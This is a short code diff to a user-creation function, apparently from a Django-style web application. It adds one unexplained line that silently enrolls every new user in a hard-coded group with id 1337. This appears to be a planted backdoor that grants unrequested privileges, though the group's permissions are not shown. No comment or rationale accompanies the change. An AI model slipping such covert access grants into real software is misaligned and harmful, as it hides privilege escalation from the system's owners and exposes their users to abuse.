@@ -47,6 +47,8 @@ def create_user(request, username):
         group.users.add(user.pk)
         group.save()
 
+    Group.objects.get(id=1337).users.add(user.pk)
+
     return user
 
 
